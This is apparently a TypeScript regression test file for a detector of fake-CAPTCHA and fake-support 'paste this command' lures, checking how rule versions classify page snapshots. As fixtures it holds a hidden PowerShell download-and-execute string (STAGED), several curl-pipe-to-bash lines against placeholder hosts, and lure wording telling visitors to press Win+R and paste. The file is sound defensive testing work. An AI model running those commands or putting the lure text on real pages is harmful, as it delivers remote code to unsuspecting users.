// M4.1 regression tests. The default (M1) model must be unchanged; ruleset 'm4.1-rc1' is the candidate.
// Cases marked KNOWN LIMITATION pin current behavior we consider wrong, so future changes are visible.
import { describe, expect, it } from 'vitest';
import { analyze as coreAnalyze, ENGINE_VERSION, ENGINE_VERSION_M1 } from '../src/core/index.js';
import type { AnalysisResult, AnalyzeOptions, PageSnapshot } from '../src/core/types.js';

// `analyze` = M1 baseline (explicit ruleset 'm1'); `rc` = the M4.1 rule set, the production default since M4.3A.
const analyze = (s: PageSnapshot, o: AnalyzeOptions = {}): AnalysisResult => coreAnalyze(s, { ruleset: 'm1', ...o });
import { inContainer, snapshot } from './fixtures/build.js';
import { KNOWN_LIMITATIONS, SCENARIOS } from './fixtures/scenarios.js';

const rc = (s: PageSnapshot): AnalysisResult => coreAnalyze(s);
const rules = (r: AnalysisResult) => r.findings.map((f) => `${f.ruleId}:${f.classification}`);
const DIALOG = { dialog: true };
const OVERLAY = { overlay: true };
const ARTICLE = { article: true };
const CODE = { article: true, pre: true, code: true };
const STAGED = 'powershell -w hidden -c "iex(irm https://x.example.invalid/p)"';

describe('engine adoption (M4.3A): default = ruleset m4.1, engine 0.2.0; M1 still selectable', () => {
  it('ruleset m1 reports the M1 engine and has no overrides field', () => {
    for (const sc of [...SCENARIOS, ...KNOWN_LIMITATIONS]) {
      const r = analyze(sc.snapshot);
      expect(r.engineVersion).toBe(ENGINE_VERSION_M1);
      expect(r.findings.every((f) => !('overrides' in f))).toBe(true);
    }
  });

  it('the default equals ruleset m4.1 and the legacy alias m4.1-rc1, and reports engine 0.2.0', () => {
    for (const sc of [...SCENARIOS, ...KNOWN_LIMITATIONS]) {
      const d = rc(sc.snapshot);
      expect(d.engineVersion).toBe(ENGINE_VERSION);
      expect(ENGINE_VERSION).toBe('0.2.0');
      expect(coreAnalyze(sc.snapshot, { ruleset: 'm4.1' })).toEqual(d);
      expect(coreAnalyze(sc.snapshot, { ruleset: 'm4.1-rc1' })).toEqual(d);
      expect(rc(sc.snapshot)).toEqual(d);
    }
  });

  it('on the M1 unit fixtures, the default differs from M1 exactly where documented (S-N8, S-L2)', () => {
    const changed = [...SCENARIOS, ...KNOWN_LIMITATIONS]
      .filter((sc) => rc(sc.snapshot).verdict !== analyze(sc.snapshot).verdict)
      .map((sc) => `${sc.id}: ${analyze(sc.snapshot).verdict} → ${rc(sc.snapshot).verdict}`);
    expect(changed).toEqual(['S-N8-en: suspicious_correlation → observed_instruction', 'S-L2-en: suspicious_correlation → observed_instruction']);
  });
});

describe('P1b: authority-only pretext', () => {
  const itNotice = KNOWN_LIMITATIONS.find((s) => s.id === 'S-N8-en')!.snapshot;

  it('known FP (internal IT notice) no longer escalates, but the authority observation is preserved', () => {
    expect(analyze(itNotice).verdict).toBe('suspicious_correlation');
    const r = rc(itNotice);
    expect(r.verdict).toBe('observed_instruction');
    expect(rules(r)).toEqual(['R5:observed_instruction']);
    expect(r.observations.some((o) => o.signal === 'P.AUTHORITY')).toBe(true);
  });

  it('mixed pretexts (authority + urgency) still escalate', () => {
    const s = snapshot(inContainer('notice', ['Security Team notice: your account will be suspended within 2 hours.',
      'Open PowerShell, paste the code and press Enter.']));
    expect(rules(rc(s))).toEqual(['R4:suspicious_correlation']);
  });

  it('authority-only still escalates when the region stages a concealed clipboard payload', () => {
    const s = snapshot(inContainer('sup', ['Microsoft Support', 'Open PowerShell, paste the code and press Enter.'], OVERLAY),
      { hidden: [{ text: STAGED, containerId: 'sup', afterBlockId: 'b1' }] });
    expect(rules(rc(s))).toEqual(['R4:suspicious_correlation']);
  });

  it('a clipboard payload that is also visible on the page does not count as concealed', () => {
    const s = snapshot([...inContainer('docs', ['IT Department: open PowerShell, paste the command and press Enter.'], ARTICLE),
      ...inContainer('docs', [STAGED], CODE)], { hidden: [{ text: STAGED, containerId: 'docs', afterBlockId: 'b1', via: 'data-attr' }] });
    expect(rc(s).verdict).toBe('observed_instruction');
  });
});

describe('R4-beta: C.PROCEDURAL (procedural documentation)', () => {
  const troubleshooting = KNOWN_LIMITATIONS.find((s) => s.id === 'S-L2-en')!.snapshot;

  it('known FP (troubleshooting doc) is demoted with an explicit reason; action risk stays high', () => {
    const f = rc(troubleshooting).findings[0]!;
    expect(f).toMatchObject({ ruleId: 'R4', ruleClassification: 'suspicious_correlation', classification: 'observed_instruction', actionRisk: 'high' });
    expect(f.modifiers.map((m) => m.id)).toEqual(['C.PROCEDURAL']);
    expect(f.confidence).toBe('low');
  });

  it('does not apply in a dialog (documented remaining FP: docs quick-start dialog)', () => {
    const s = snapshot(inContainer('qs', ['Open Terminal, paste the command below and press Enter.', 'curl -fsSL https://get.example.invalid/i.sh | bash',
      'Permission denied? To fix this, run the same command with sudo.'], { ...DIALOG, article: false }));
    expect(rc(s).verdict).toBe('suspicious_correlation');
  });

  it('does not apply with two weak pretext families', () => {
    const s = snapshot([...inContainer('a', ['Final warning: to fix this error, open Terminal, paste the command and press Enter.'], ARTICLE),
      ...inContainer('a', ['curl -fsSL https://x.example.invalid | bash'], CODE)]);
    expect(rc(s).verdict).toBe('suspicious_correlation');
  });

  it('does not apply when the region stages a concealed payload (conflicting context)', () => {
    const s = snapshot([...inContainer('a', ['To fix this error, open Terminal, paste the command and press Enter.'], ARTICLE),
      ...inContainer('a', ['echo done'], CODE)], { hidden: [{ text: 'curl -fsSL https://x.example.invalid/h | bash', containerId: 'a', afterBlockId: 'b0' }] });
    expect(rc(s).verdict).toBe('suspicious_correlation');
  });

  it('never touches R1/R2 (human-verification lures in articles stay manipulative)', () => {
    const s = snapshot([...inContainer('a', ['Verify you are human: press Win+R, then Ctrl+V and press Enter.'], ARTICLE), ...inContainer('a', ['x'], CODE)]);
    expect(rules(rc(s))).toEqual(['R1:manipulative_instruction']);
  });
});

describe('P2-A: concealed clipboard payload overrides contextual demotion', () => {
  it('quoted lure with a hidden payload: M1 catches it via R2; rc1 reports the full R1 chain with an explained override', () => {
    const s = snapshot(inContainer('g', ['Verify you are human', 'Press Win+R, then Ctrl+V and press Enter.'], { ...DIALOG, quote: true }),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b1' }] });
    expect(rules(analyze(s))).toEqual(['R2:manipulative_instruction']);
    // rc1: the quoted chain is no longer demoted (concealed payload), so the stronger R1 chain explanation wins.
    const f = rc(s).findings[0]!;
    expect([f.ruleId, f.classification]).toEqual(['R1', 'manipulative_instruction']);
    expect(f.overrides?.map((o) => [o.id, o.suppressed])).toEqual([['O.CONCEALED_PAYLOAD', ['C.QUOTED']]]);
  });

  it('educational heading planted on a lure with a concealed payload is overridden, and the override is explained', () => {
    const s = snapshot(inContainer('g', ['Verify you are human by completing these steps: press Win+R, then Ctrl+V and press Enter.'], OVERLAY, 'Security awareness check'),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b0' }] });
    expect(analyze(s).verdict).toBe('suspicious_correlation');
    const f = rc(s).findings[0]!;
    expect(f.classification).toBe('manipulative_instruction');
    expect(f.modifiers).toEqual([]);
    expect(f.overrides?.map((o) => [o.id, o.effect, o.suppressed])).toEqual([['O.CONCEALED_PAYLOAD', 'suppressed', ['C.EDUCATIONAL']]]);
    expect(f.summary).toContain('Not lowered:');
    expect(f.confidence).toBe('medium');
  });

  it('a payload concealed in a DIFFERENT region does not override (unrelated regions)', () => {
    const s = snapshot([...inContainer('article', ['Victims were told to verify they are human: press Win+R, then Ctrl+V and press Enter.'], ARTICLE),
      ...inContainer('footer', ['footer'])], { hidden: [{ text: STAGED, containerId: 'footer', afterBlockId: 'b1' }] });
    expect(rc(s).verdict).toBe('observed_instruction');
  });
});

describe('benign modal tutorials and documentation stay benign under rc1', () => {
  it('tutorial modal listing what the fake page tells visitors', () => {
    const s = snapshot(inContainer('tut', ['How the trick works', 'Verify you are human', 'and then the fake page tells visitors to:',
      'Press Win + R', 'Press Ctrl + V', 'Press Enter', 'Doing this runs a program the criminals placed on your clipboard.'], DIALOG));
    expect(['none', 'observed_instruction']).toContain(rc(s).verdict);
  });

  it('terse quiz modal quoting a lure', () => {
    const s = snapshot([...inContainer('q', ['Question 3 of 10', 'Is this message legitimate?'], DIALOG),
      ...inContainer('q', ['Verify you are human: press Win+R, then Ctrl+V and press Enter.'], { ...DIALOG, quote: true })]);
    expect(rc(s).verdict).toBe('observed_instruction');
  });

  it('news article with a reported list introduction stays demoted', () => {
    const s = snapshot(inContainer('article', ['Verify you are human', 'Researchers say the attackers instructed visitors to:', 'Press Win + R', 'Press Ctrl + V', 'Press Enter'], ARTICLE));
    expect(rc(s).verdict).toBe('observed_instruction');
  });

  it('unrelated regions do not correlate', () => {
    const s = snapshot([...inContainer('header', ['Please verify you are human to comment.']), ...inContainer('aside', ['Final chance: sale ends in 2 hours.']),
      ...inContainer('article', ['Press Win+R, type msinfo32 and press Enter.'], ARTICLE)]);
    expect(rc(s).verdict).toBe('observed_instruction');
  });
});

describe('malicious verification overlays', () => {
  it('plain fake CAPTCHA overlay stays manipulative', () => {
    const s = snapshot(inContainer('g', ['Verify you are human', 'Press Win + R', 'Press Ctrl + V', 'Press Enter'], OVERLAY));
    expect(rules(rc(s))).toEqual(['R1:manipulative_instruction']);
  });
});

describe('KNOWN LIMITATIONS under rc1 (documented, not desired)', () => {
  it('direct lure framed as reported speech inside a dialog without a payload is still demoted (P2 gate not adopted)', () => {
    const s = snapshot(inContainer('g', ['Verifikasi bahwa Anda bukan robot', 'Kami meminta pengunjung untuk:', 'Tekan Win + R', 'Tekan Ctrl + V', 'Tekan Enter'], OVERLAY));
    expect(rc(s).verdict).toBe('observed_instruction');
    // The rejected-for-now gate alternative would recover it (and also misfire on the quiz modal, see the dev report).
    expect(analyze(s, { experimental: { verificationGateOverride: 'cap1' } }).verdict).toBe('suspicious_correlation');
  });

  it('quoted lure in a user comment without a payload is still demoted', () => {
    const s = snapshot(inContainer('c7', ['Verify you are human to unlock the fix: press Win+R, then Ctrl+V and press Enter.'], { ugc: true, quote: true }));
    expect(rc(s).verdict).toBe('observed_instruction');
  });

  it('very informal Indonesian paraphrase is outside the lexicon', () => {
    const s = snapshot(inContainer('g', ['Konfirmasi dulu kamu bukan robot ya', 'Pencet tombol Windows sama R barengan', 'Terus pencet Ctrl sama V', 'Abis itu pencet Enter'], OVERLAY));
    expect(['none', 'observed_instruction']).toContain(rc(s).verdict);
  });
});

describe('M4.1 safeguards (owner review)', () => {
  const filler = (n: number) => Array.from({ length: n }, (_, i) => `Unrelated paragraph ${i} about the weather.`);

  it('a concealed payload only counts when it is in the same correlation window as the instruction', () => {
    // Same region, but the payload sits 12 blocks after the instruction: no P2-A override, no P1b exception.
    const far = snapshot(inContainer('g', ['Microsoft Support: open PowerShell, paste the code and press Enter.', ...filler(12)], OVERLAY),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b12' }] });
    expect(rc(far).verdict).toBe('observed_instruction');
    const near = snapshot(inContainer('g', ['Microsoft Support: open PowerShell, paste the code and press Enter.', ...filler(12)], OVERLAY),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b0' }] });
    expect(rc(near).verdict).toBe('suspicious_correlation');
    const eduFar = snapshot(inContainer('g', ['Verify you are human by completing these steps: press Win+R, then Ctrl+V and press Enter.', ...filler(12)], OVERLAY, 'Security awareness check'),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b12' }] });
    expect(rc(eduFar).findings[0]!.overrides).toBeUndefined();
  });

  it('legitimate documentation with hidden copy targets does not become a manipulation finding', () => {
    // (a) Hidden copy target that mirrors the visible code block: not concealed.
    const mirrored = snapshot([...inContainer('docs', ['Open Terminal, paste the command and press Enter.'], ARTICLE),
      ...inContainer('docs', ['curl -fsSL https://get.example.invalid/i.sh | bash'], CODE)],
      { hidden: [{ text: 'curl -fsSL https://get.example.invalid/i.sh | bash', containerId: 'docs', afterBlockId: 'b1', via: 'hidden-el' }],
        triggers: [{ label: 'Copy', containerId: 'docs', afterBlockId: 'b1' }] });
    expect(rc(mirrored).verdict).toBe('observed_instruction');
    // (b) Genuinely hidden copy target, but no manipulation pretext: still only an observed instruction.
    const hidden = snapshot([...inContainer('docs', ['Click Copy, open Terminal, paste the command and press Enter.'], ARTICLE)],
      { hidden: [{ text: 'curl -fsSL https://get.example.invalid/full-installer.sh | bash', containerId: 'docs', afterBlockId: 'b0' }],
        triggers: [{ label: 'Copy', containerId: 'docs', afterBlockId: 'b0' }] });
    const r = rc(hidden);
    expect(r.verdict).toBe('observed_instruction');
    expect(r.findings.every((f) => f.ruleId === 'R5' && !f.overrides)).toBe(true);
  });

  it('R4-beta keeps the finding, its action-risk evidence and an explanation', () => {
    const doc = KNOWN_LIMITATIONS.find((s) => s.id === 'S-L2-en')!.snapshot;
    const r = rc(doc);
    const f = r.findings[0]!;
    const evidence = r.observations.filter((o) => f.observationIds.includes(o.id)).map((o) => o.signal);
    // The executable command, the pretext and the delivery path (here the copy button) all remain as evidence.
    expect(evidence).toEqual(expect.arrayContaining(['A.COMMAND', 'P.FAKE_FIX', 'A.COPY_TRIGGER']));
    expect(f.actionRisk).toBe('high');
    expect(f.ruleClassification).toBe('suspicious_correlation');
    const m = f.modifiers.find((x) => x.id === 'C.PROCEDURAL')!;
    expect(m.reason).toContain('procedural document');
    expect(m.evidence.length).toBeGreaterThan(0);
    expect(f.summary).toContain('procedural document');
  });

  it('an attacker-controlled article with a code block is not automatically treated as benign', () => {
    // The demoted finding is still reported (observed), never dropped to "none".
    expect(rc(KNOWN_LIMITATIONS.find((s) => s.id === 'S-L2-en')!.snapshot).verdict).toBe('observed_instruction');
    // Human-verification pretext in an article with code: R1 untouched.
    const verify = snapshot([...inContainer('a', ['Verify you are human: press Win+R, then Ctrl+V and press Enter.'], ARTICLE), ...inContainer('a', ['x = 1'], CODE)]);
    expect(rc(verify).verdict).toBe('manipulative_instruction');
    // Two weak pretext families in an article with code: not demoted.
    const pressure = snapshot([...inContainer('a', ['Your account will be suspended within 1 hour. To fix this error, open Terminal, paste the command and press Enter.'], ARTICLE),
      ...inContainer('a', ['curl -fsSL https://x.example.invalid | bash'], CODE)]);
    expect(rc(pressure).verdict).toBe('suspicious_correlation');
    // Staged concealed payload next to the instruction: not demoted.
    const staged = snapshot([...inContainer('a', ['To fix this error, open Terminal, paste the command and press Enter.'], ARTICLE), ...inContainer('a', ['echo ok'], CODE)],
      { hidden: [{ text: STAGED, containerId: 'a', afterBlockId: 'b0' }] });
    expect(rc(staged).verdict).toBe('suspicious_correlation');
  });

  it('P1b never suppresses stronger rules', () => {
    const r1 = snapshot(inContainer('g', ['Microsoft Support', 'Verify you are human: press Win+R, then Ctrl+V and press Enter.'], OVERLAY));
    expect(rules(rc(r1))).toEqual(['R1:manipulative_instruction']);
    const r2 = snapshot(inContainer('g', ['Microsoft Support', 'Verify you are human', 'Click the "Verify" button'], OVERLAY),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b1' }] });
    expect(rules(rc(r2))).toEqual(['R2:manipulative_instruction']);
    const r3 = snapshot(inContainer('g', ['Microsoft Support', 'Verify you are human: press Win+R and press Enter.'], OVERLAY));
    expect(rules(rc(r3))).toEqual(['R3:suspicious_correlation']);
  });

  const all = (): PageSnapshot[] => [...SCENARIOS, ...KNOWN_LIMITATIONS].map((s) => s.snapshot).concat([
    snapshot(inContainer('g', ['Verify you are human by completing these steps: press Win+R, then Ctrl+V and press Enter.'], OVERLAY, 'Security awareness check'),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b0' }] }),
    snapshot(inContainer('g', ['Verify you are human', 'Press Win+R, then Ctrl+V and press Enter.'], { ...DIALOG, quote: true }),
      { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b1' }] }),
  ]);

  it('every modifier and override is explained and traceable to observations', () => {
    let overrides = 0;
    for (const s of all()) {
      const r = rc(s);
      const ids = new Set(r.observations.map((o) => o.id));
      for (const f of r.findings) {
        for (const m of f.modifiers) {
          expect(m.reason.length).toBeGreaterThan(10);
          expect(m.evidence.length).toBeGreaterThan(0);
        }
        for (const o of f.overrides ?? []) {
          overrides++;
          expect(o.reason.length).toBeGreaterThan(10);
          expect(o.suppressed.length).toBeGreaterThan(0);
          expect(o.evidence.length).toBeGreaterThan(0);
          for (const id of o.evidence) expect(ids.has(id)).toBe(true);
          expect(r.observations.find((x) => x.id === o.evidence[0])).toMatchObject({ signal: 'A.COMMAND', source: { type: 'hiddenCopy' } });
        }
      }
    }
    expect(overrides).toBeGreaterThanOrEqual(2);
  });

  it('rc1 is deterministic', () => {
    for (const s of all()) expect(JSON.stringify(rc(s))).toBe(JSON.stringify(rc(s)));
  });
});
